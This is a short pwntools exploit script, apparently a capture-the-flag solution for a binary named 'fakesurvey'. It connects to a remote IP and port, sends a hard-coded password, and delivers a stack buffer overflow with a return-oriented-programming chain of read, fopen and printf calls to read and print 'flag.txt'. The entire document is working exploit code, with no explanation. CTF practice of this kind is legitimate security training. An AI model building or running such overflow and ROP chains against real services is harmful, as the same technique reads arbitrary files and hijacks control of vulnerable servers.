from pwn import *

r = remote("185.235.41.205", 7050)
#r = process("./fakesurvey")
#gdb.attach(r)

r.recvuntil(b'Enter password:')
r.sendline(b"CPRSyRMOFa3FVIF")
print(r.recvuntil(b"competition :)"))


pop_ret = 0x08049022
pop_pop_ret = 0x080492bc
pop_pop_pop_ret = 0x08049711

flag_file = 0x0804c100
flag_value = 0x0804c200


read_func = 0x8049100
fopen_func = 0x8049170
printf_func = 0x8049110

padding = b"a"*0x4c 
payload = padding + p32(read_func) + p32(pop_pop_pop_ret) + p32(0) + p32(flag_file) + p32(0x10)
payload += p32(fopen_func) + p32(pop_pop_ret) + p32(flag_file) + p32(0x804a53d)
payload += p32(read_func) + p32(pop_pop_pop_ret) + p32(4) + p32(flag_value) + p32(0x40)
payload += p32(printf_func) + p32(0x61616161) + p32(flag_value)


r.sendline(payload)
print(r.recvuntil("with us"))

r.send(b"flag.txt")

r.interactive()